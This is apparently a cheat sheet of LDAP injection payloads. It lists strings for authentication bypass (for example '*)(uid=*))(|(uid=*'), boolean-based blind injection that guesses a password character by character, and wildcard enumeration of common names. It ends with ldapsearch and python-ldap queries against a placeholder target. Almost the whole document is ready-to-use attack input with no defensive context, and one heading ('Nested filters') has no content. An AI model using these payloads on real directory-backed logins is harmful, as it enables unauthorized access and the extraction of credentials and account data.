# LDAP Injection Payloads

## ========================================
## BASIC LDAP INJECTION
## ========================================

# Authentication Bypass
*
*)(&
*))%00
admin)(&
admin)(!(&
*)(uid=*))(|(uid=*
*)(|(objectclass=*)

# OR operator
admin)(|(password=*))
*)(uid=*))(&(uid=*

## ========================================
## BLIND LDAP INJECTION
## ========================================

# Boolean-based
admin)(&(password=*))
admin)(&(password=a*))
admin)(&(password=ab*))

# Extract information
*)(cn=a*)
*)(cn=ad*)
*)(cn=adm*)
*)(cn=admi*)
*)(cn=admin*)

## ========================================
## LDAP FILTERS
## ========================================

# Basic Filter Syntax
(cn=admin)
(uid=admin)
(mail=admin@example.com)

# AND operator
(&(cn=admin)(password=pass))

# OR operator
(|(cn=admin)(cn=user))

# NOT operator
(!(cn=admin))

## ADVANCED TECHNIQUES
## ========================================

# Nested filters

# Complex OR
(|(cn=admin)(mail=admin@*)(uid=admin))

## ========================================
## TOOLS
## ========================================

# ldapsearch
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)"

# Python
import ldap
conn = ldap.initialize('ldap://target.com')
result = conn.search_s('dc=example,dc=com', ldap.SCOPE_SUBTREE, '(cn=*)')
